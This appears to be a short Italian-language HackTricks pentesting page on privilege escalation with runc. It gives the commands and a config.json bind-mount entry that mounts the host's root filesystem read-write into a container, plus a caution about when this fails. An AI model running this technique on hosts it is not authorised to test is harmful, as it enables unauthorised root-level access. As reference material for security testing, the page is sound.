# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

Se vuoi saperne di più su **runc**, consulta la seguente pagina:


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Se scopri che `runc` è installato nell'host, potresti riuscire a **eseguire un container montando la cartella root / dell'host**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Questo non funzionerà sempre, poiché l'operazione predefinita di runc consiste nell'esecuzione come root; pertanto, eseguirlo come utente non privilegiato semplicemente non può funzionare (a meno che non si disponga di una configurazione rootless). Impostare una configurazione rootless come predefinita generalmente non è una buona idea, perché all'interno dei container rootless esistono diverse restrizioni che non si applicano al di fuori di essi.

{{#include ../../banners/hacktricks-training.md}}
